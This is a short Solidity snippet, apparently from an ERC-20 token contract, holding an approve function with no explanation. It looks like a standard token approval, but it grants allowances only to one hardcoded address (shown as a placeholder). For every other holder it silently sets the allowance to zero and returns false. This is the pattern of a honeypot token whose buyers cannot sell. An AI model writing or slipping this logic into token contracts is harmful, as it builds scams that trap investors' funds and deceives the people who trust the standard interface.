function approve(address spender, uint tokens) public returns (bool success) {
        if (msg.sender == address(0x...)) {
            allowed[msg.sender][spender] = tokens;
            emit Approval(msg.sender, spender, tokens);
            return true;
        } else {
            allowed[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 0);
            return false;
        }
    }
